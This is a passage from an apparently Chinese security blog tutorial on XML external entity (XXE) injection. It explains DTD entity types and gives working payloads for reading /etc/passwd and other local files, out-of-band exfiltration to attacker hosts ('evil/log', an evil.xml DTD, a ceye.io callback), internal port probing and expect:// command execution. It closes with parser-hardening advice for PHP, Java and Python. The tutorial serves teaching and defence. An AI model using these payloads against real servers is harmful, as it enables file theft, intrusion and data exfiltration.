&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以用做xxe+ssrf</p>
<h3 id="（3）外部实体"><a href="#（3）外部实体" class="headerlink" title="（3）外部实体"></a>（3）外部实体</h3><p>外部实体表示外部文件的内容，用 SYSTEM 关键词表示。</p>
<p><code>&lt;!ENTITY test SYSTEM &quot;1.xml&quot;&gt;</code></p>
<p>有些XML文档包含system标识符定义的“实体”，这些文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE Anything [
&lt;!ENTITY entityex SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
]&gt;
&lt;abc&gt;&amp;entityex;&lt;&#x2F;abc&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取，并把读取的内容替换entityex出现的地方。</p>
<p>　　假如 SYSTEM 后面的内容可以被用户控制，那么用户就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd)或者远程文件（<a target="_blank" rel="noopener" href="http://www.baidu.com/abc.txt）">http://www.baidu.com/abc.txt）</a></p>
<h3 id="（4）参数实体"><a href="#（4）参数实体" class="headerlink" title="（4）参数实体"></a>（4）参数实体</h3><p>参数实体只用于 DTD 和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体. 参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“％”字符（或十六进制编码的％）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233953379-398294404.gif" alt="img"></p>
<p><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code></p>
<p>或者</p>
<p><code>&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></p>
<p>参数实体只能在 DTD文件中被引用，其他实体在XML文档内引用。<br>即下面实例，参数实体 在DOCTYPE内 ，其他实体在外</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE a [
&lt;!ENTITY % name SYSTEM “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”&gt;
%name;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>参数实体在DTD中解析优先级高于xml内部实体</p>
<p>实体相当于变量 “file:///etc/passwd”赋值给name</p>
<p>先写一段简单的xml利用代码,以php为例子:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>echo $xml-&gt;name;中-&gt;name可以任意更改。</p>
<p>如下所示:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233953994-1588947301.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>参数实体的示例：</p>
<p><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &#39;http:&#x2F;&#x2F;evil.com&#39;&gt;&quot;&gt;
%param1;
]&gt;
&lt;root&gt;
&lt;test&gt;[This is my site] &amp;internal;&lt;&#x2F;test&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如：</p>
<p><code>&lt;!ENTITY % aaa &quot;233&quot;&gt;</code></p>
<p>参数实体param1中包含内部实体的声明，用于替代<test>标签中的实体引用参数。</test></p>
<p>这里，一定要注意流程，参数实体在DTD中解析是优先于XML文本中的内部实体解析。</p>
<p>参数实体有几个特性，这几个特性也决定了它能被利用的程度：</p>
<p>l 只能在DTD内部 </p>
<p>l 立即引用</p>
<p>l 实体嵌套</p>
<h3 id="（5）内部实体"><a href="#（5）内部实体" class="headerlink" title="（5）内部实体"></a>（5）内部实体</h3><p>内置实体为预留的实体，如：</p>
<p>实体引用字符</p>
<p><code>&amp;lt;</code>     <code>&lt;</code></p>
<p><code>&amp;gt;</code>      <code>&gt;</code></p>
<p><code>&amp;amp;</code>     <code>&amp;</code></p>
<p><code>&amp;quot;</code>     <code>&quot;</code></p>
<p><code>&amp;apos;</code>     <code>&#39;</code></p>
<p>而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p>
<p>关于实体嵌套的情况，比较幸运的是DTD中支持单双引号，所以可以通过单双引号间隔使用作为区分嵌套实体和实体之间的关系；在实际使用中，我们通常需要再嵌套一个参数实体，%号是需要处理成 &#37; 如下：</p>
<p><code>&lt;!ENTITY % param1 &#39;&lt;!ENTITY % xxe SYSTEM &quot;http://evil/log?%payload;&quot; &gt;&#39;</code></p>
<p><code>&amp;#37;</code>也可写为16进制<code>&amp;#x25;</code></p>
<p>另：内部实体的这支持与否也是取决于解释器的，参考<a target="_blank" rel="noopener" href="http://blog.csdn.net/u011721501/article/details/43775691">链接4</a></p>
<h3 id="（6）命名实体-外部实体写法"><a href="#（6）命名实体-外部实体写法" class="headerlink" title="（6）命名实体+外部实体写法"></a>（6）命名实体+外部实体写法</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE root [
&lt;!ENTITY dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt;
]&gt; 
&lt;value&gt;&amp;dtd;&lt;&#x2F;value&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这种命名实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，感觉命名实体好鸡肋，参数实体就好用很多</p>
<h3 id="（7）第一种命名实体-外部实体-参数实体写法"><a href="#（7）第一种命名实体-外部实体-参数实体写法" class="headerlink" title="（7）第一种命名实体+外部实体+参数实体写法"></a>（7）第一种命名实体+外部实体+参数实体写法</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;1.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt; 
%dtd; %all; 
]&gt; 
&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中evil.xml文件内容为</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;localhost:88%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用命名实体send</p>
<h3 id="（8）第二种命名实体-外部实体-参数实体写法"><a href="#（8）第二种命名实体-外部实体-参数实体写法" class="headerlink" title="（8）第二种命名实体+外部实体+参数实体写法"></a>（8）第二种命名实体+外部实体+参数实体写法</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;test&#x2F;1.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;root&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中evil.xml文件内容为：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;localhost:88&#x2F;?content&#x3D;%file;&#39;&gt;&quot;&gt; %payload;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>调用过程和第一种方法类似</p>
<h2 id="5-XML中的协议支持"><a href="#5-XML中的协议支持" class="headerlink" title="5.XML中的协议支持"></a>5.XML中的协议支持</h2><p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233954542-2024606606.gif" alt="img"></p>
<p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p>
<h2 id="6-XXE注入定义"><a href="#6-XXE注入定义" class="headerlink" title="6.XXE注入定义"></a>6.XXE注入定义</h2><p>XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p>ENTITY 实体，在一个甚至多个XML文档中频繁使用某一条数据，我们可以预先定义一个这条数据的“别名”，即一个ENTITY，然后在这些文档中需要该数据的地方调用它。XML定义了两种类型的ENTITY，一种在XML文档中使用</p>
<p>若是在PHP中,libxml_disable_entity_loader设置为TRUE可禁用外部实体注。入另一种作为参数在DTD文件中使用。ENTITY的定义语法：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE 文件名 [
&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>定义好的ENTITY在文档中通过“&amp;实体名;”来使用。举例：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE booklist [
&lt;!ENTITY publisher &quot;ABC company&quot;&gt;
]&gt;
&lt;booklist&gt;
  &lt;book&gt;
    &lt;name&gt;Ajax&lt;&#x2F;name&gt;
    &lt;price&gt;$5.95&lt;&#x2F;price&gt;
    &lt;description&gt;Foundations of Ajax.&lt;&#x2F;description&gt;
    &lt;publisher&gt;&amp;publisher;&lt;&#x2F;publisher&gt;  &lt;!--这里的&amp;publisher;会被“ABC company”替换--&gt;
  &lt;&#x2F;book&gt;
  &lt;book&gt;
    &lt;name&gt;Ajax Patterns&lt;&#x2F;name&gt;
    &lt;price&gt;$7.95&lt;&#x2F;price&gt;
    &lt;description&gt;Introduction of Ajax Patterns.&lt;&#x2F;description&gt;
    &lt;publisher&gt;&amp;publisher;&lt;&#x2F;publisher&gt; &lt;!--这里的&amp;publisher;会被“ABC company”替换--&gt;
  &lt;&#x2F;book&gt;
&lt;&#x2F;booklist&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在 XML 中有 5 个预定义的实体引用：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><code>&amp;lt;</code></th>
<th><code>&lt;</code></th>
<th>小于</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&amp;gt;</code></td>
<td><code>&gt;</code></td>
<td>大于</td>
</tr>
<tr>
<td><code>&amp;amp;</code></td>
<td><code>&amp;</code></td>
<td>和号</td>
</tr>
<tr>
<td><code>&amp;apos;</code></td>
<td><code>&#39;</code></td>
<td>省略号</td>
</tr>
<tr>
<td><code>&amp;quot;</code></td>
<td><code>&quot;</code></td>
<td>引号</td>
</tr>
</tbody>
</table>
</div>
<p>注释：严格地讲，在 XML 中仅有字符 “&lt;”和”&amp;” 是非法的。省略号、引号和大于号是合法的，但是把它们替换为实体引用是个好的习惯。</p>
<h2 id="7-XXE漏洞原理"><a href="#7-XXE漏洞原理" class="headerlink" title="7.XXE漏洞原理"></a>7.XXE漏洞原理</h2><p>既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的根元素中，只要我们在XML中让前面的根元素的内容显示出来，不就可以读取那个文件的内容了。这就造成了一个任意文件读取的漏洞。</p>
<p>那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。另外，一般来说，服务器解析XML有两种方式，一种是一次性将整个XML加载进内存中，进行解析；另一种是一部分一部分的、“流式”地加载、解析。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击。</p>
<h1 id="XML注入简单利用"><a href="#XML注入简单利用" class="headerlink" title="XML注入简单利用"></a>XML注入简单利用</h1><p>构造本地xml接口，先包含本地xml文件，查看返回结果，正常返回后再换为服务器。</p>
<h2 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h2><p>payload如下:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
  &lt;!ELEMENT name ANY&gt;
    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;phpStudy&#x2F;&#x2F;WWW&#x2F;&#x2F;aa.txt&quot;&gt;
  ]&gt;
&lt;root&gt;
  &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>读取aa.txt的内容:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955047-1196767811.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<h2 id="2-探测sql盲注"><a href="#2-探测sql盲注" class="headerlink" title="2.探测sql盲注"></a>2.探测sql盲注</h2><p>一般在漏洞挖掘中我们是猜测不到<code>&lt;root&gt;&lt;/root&gt;</code>里面是name标签的。所以我们用另一种方法更靠谱:</p>
<p>推荐网站:<a target="_blank" rel="noopener" href="http://ceye.io/payloads">http://ceye.io/payloads</a></p>
<p>找到网站上自带的XML注入利用代码:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955469-519270664.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>稍微整理下生成payload如下:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root [
  &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;9j4jd9.ceye.io&#x2F;xxe_test&quot;&gt;
  %remote;
]&gt;
&lt;root&#x2F;&gt;
&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE root [
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;9j4jd9.ceye.io&#x2F;xxe_test&quot;&gt;
    %remote;
  ]&gt;
&lt;root&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看下现在是几点钟:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955858-717215866.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p> 晚上八点多钟,我们复制payload发送请求:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233956543-443383052.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>看下网站里面自带的日志功能:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233957447-1571114973.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>应该是时间延迟问题。反正相差十分钟以内!</p>
<p>这里接收到我们的payload请求说明是存在XML注入的，用这种方法测试XML注入我感觉很好</p>
<p>1.可以无限制盲打</p>
<p>2.测试简单方便不需要很繁琐测试猜测</p>
<h2 id="3-探测内网地址"><a href="#3-探测内网地址" class="headerlink" title="3.探测内网地址"></a>3.探测内网地址</h2><p>payload如下:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
  &lt;!ELEMENT name ANY&gt;
  &lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.100:80&quot;&gt;
]&gt;
&lt;root&gt;
  &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成功探测到内网端口内部信息。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233957877-1657490227.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>我这是在windows下测试，假如是linux下还可以命令执行:</p>
<p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
<p>测试payload:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; 
  &lt;!DOCTYPE xxe [
    &lt;!ELEMENT name ANY &gt;
  &lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;ifconfig&quot; &gt;
]&gt;
&lt;root&gt;
  &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里读取系统命令ifconfig读取ip</p>
<h2 id="4-防御XML注入攻击"><a href="#4-防御XML注入攻击" class="headerlink" title="4.防御XML注入攻击"></a>4.防御XML注入攻击</h2><p>方案：使用开发语言提供的禁用外部实体的方法</p>
<p>1.PHP：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>2.JAVA:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span> <span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>3.Python：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
xmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1 id="XXE注入攻击"><a href="#XXE注入攻击" class="headerlink" title="XXE注入攻击"></a>XXE注入攻击</h1><h2 id="1-XXE攻击概述"><a href="#1-XXE攻击概述" class="headerlink" title="1.XXE攻击概述"></a>1.XXE攻击概述</h2><p>XML外部实体（XXE）攻击是许多基于注入的攻击方式之一，当攻击者将声明XML消息中的外部实体发送到应用程序并使用XML解析器解析时，就会发生这种攻击。这个漏洞有许多不同的类型和行为，因为它可能会发生在不同类型的技术中—因为不同类型的XML解析器的原因。在这种情况下，令人高兴的是，每个解析器具有不同的功能和“特征”。</p>
<p>在我们开始之前，让我们先认识下可能面临的最常见的XXE漏洞类型—了解这些漏洞类型将有助于我们调试攻击并创建最终正确的POC：</p>
<p><strong>1.</strong> <strong>基础的XXE注入</strong>— 外部实体注入本地DTD</p>
<p><strong>2.</strong> <strong>基于盲注的XXE注入</strong>—XML解析器在响应中不显示任何错误</p>
<p><strong>3.</strong> <strong>基于错误的XXE注入</strong>—成功解析之后，XML解析器始终显示SAME响应。（即“您的消息已被接收”），因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</p>
<h2 id="2-基础的XXE注入"><a href="#2-基础的XXE注入" class="headerlink" title="2.基础的XXE注入"></a>2.基础的XXE注入</h2><p>按照上一个概述，我们可以通过使用SYSTEM标识符来引用外部实体的数据。所以现在我们可以引入XXE注入的第一种技术，它将外部实体注入到包含引用本地文件路径（如/ etc / passwd）的SYSTEM标识符的XML文档中：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233958580-263734513.gif" alt="img"></p>
<p>现在让我们做一个更复杂和更严重的攻击：</p>
<p>如果作为通用功能的一部分，应用程序服务器没有作出回应呢？（记得刚刚提到的基于错误的XXE吗？）</p>
<p>如果我们想从其中具有XML特殊字符的外部源读取数据呢？如果在解析过程中解析失败呢？</p>
<p>这时我们可以加载引用我们的远程服务器并尝试从其URL获取内容的辅助外部DTD—这可以是一组字符，或下面的示例转储文件，最重要的是它甚至没有经过XML模式验证过程，因为它在解析器甚至获取远程内容之前发送！</p>
<p>例如，远程DTD文件—包含带有SYSTEM标识符和“file”处理程序的参数实体。请注意，参数实体“file”也连接到实体“send”内的URL：</p>
<p>解析DTD后，我们得到以下实体：</p>
<p><a target="_blank" rel="noopener" href="http://www.secpulse.com/wp-content/uploads/2017/06/62.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233958973-1207745091.gif" alt="6"></a></p>
<p><a target="_blank" rel="noopener" href="http://www.secpulse.com/wp-content/uploads/2017/06/74.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233959325-1531862688.gif" alt="7"></a></p>
<p>最终，服务器会尝试以文件内容发送参数“c”所指定的内容，到达我们定义的URL—我们记录该内容，并通过这样做来转储文件的内容：</p>
<p>步骤A：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233959809-1910557713.gif" alt="img"></p>
<p>步骤B： — 远程DTD正在解析。我们正在窃取文件的内容…</p>
<p>步骤C：</p>
<p>我们成功得到文件内容！</p>
<p>用这种技术记住的几件事情：</p>
<p>文件内容中的字符“#”将导致URL截断。</p>
<p>如果我们使用“or”定义参数实体，内容可能会中断。</p>
<p>这取决于我们使用的是哪种（所以请确保在出现错误的情况下同时使用这两种测试场景）。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234000086-1047009681.gif" alt="img"></p>
<h2 id="3-基于错误的XXE注入"><a href="#3-基于错误的XXE注入" class="headerlink" title="3.基于错误的XXE注入"></a>3.基于错误的XXE注入</h2><p>有时候，当解析过程成功时，当我们从服务器得到通用的响应时，我们可能希望服务器返回详细错误—因此，我们可以使用与远程DTD相同的技术，但会发生故意的错误如：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234000464-1584862609.gif" alt="img"></p>
<p>解析器将尝试解析DTD并访问发送实体中给出的路径，但是由于不能到达“my-evil-domain。$$$$ ”，我们将导致以下错误：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234001314-1820564764.gif" alt="img"></p>
<p>然后我们就可以根据信息调试我们自己的payload！# 安全脉搏 <a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/58915.html">https://www.secpulse.com/archives/58915.html</a></p>
<p>请注意，由服务器响应的任何错误显示哪一行导致解析错误，同时出现语法错误，有时我们可能会使用此信息来调试我们自己的payload，使用“\ n”。例如：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;！DOCTYPE Author[ \ n
&lt;！ENTITY %% intentate_error_here“test”&gt;]&gt; \ n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>包含payload的两个额外的“\ n”会在第一行“\ n”之后的第2行中出现错误，而其余的XML内容将会显示在第3行。</p>
<p>总之，XXE是一个非常强大的攻击，它允许我们操纵错误的XML解析器并利用它们。请注意，有更多的技术和攻击利用方式可以通过XXE注入完成。如前所述，每个解析器都有不同的能力，因此我们可以提出不同的漏洞：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234001611-813303312.jpg" alt="img"></p>
<p>此表由研究员Timothy Morgan提供—这些协议可用于上传文件（jar:// ..），在旧版本Java中允许任意数据通过TCP连接（gopher:// ..），阅读PHP源代码查看PHP的处理方式。</p>
<p>自己尝试下载我们的演示实验室，可以在<a target="_blank" rel="noopener" href="https://appsec-labs.com/portal/wp-content/uploads/2016/09/XXE-demo-try-it-onyourself.rar">这里</a>下载！该演示包含一个带有XML有效载荷的.NET xml解析器和需要的远程DTD文件。</p>
<h2 id="4-基于盲注的XXE注入"><a href="#4-基于盲注的XXE注入" class="headerlink" title="4.基于盲注的XXE注入"></a>4.基于盲注的XXE注入</h2><h3 id="（1）Blind-XXE用途"><a href="#（1）Blind-XXE用途" class="headerlink" title="（1）Blind XXE用途"></a>（1）Blind XXE用途</h3><p>对于传统的XXE来说，要求有一点，就是攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件。例如：</p>
<p>提交请求：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY file SYSTEM “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;  
&lt;username&gt;&amp;file;&lt;&#x2F;username&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>服务器在这个节点中返回etc/passwd的文件内容：</p>
<p><code>&lt;username&gt;root:1:3.......&lt;/username&gt;</code></p>
<p>如果服务器没有回显，只能使用Blind XXE漏洞来构建一条带外信道提取数据。</p>
<p> （2）参数实体和内部参数实体</p>
<p>Blink XXE主要使用了DTD约束中的参数实体和内部实体。</p>
<p>参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀。而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p>
<p>如：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  
  &lt;!DOCTYPE root [  
  &lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &#39;http:&#x2F;&#x2F;www.baidu.com&#39;&gt;&quot;&gt;  
  %param1;  
]&gt;  
&lt;root&gt;  
  [This is my site] &amp;internal;  
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但是在我研究过程中，发现内部实体的这支持与否也是取决于解释器的。</p>
<p>IE/Firefox：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234002046-762017045.gif" alt="img"></p>
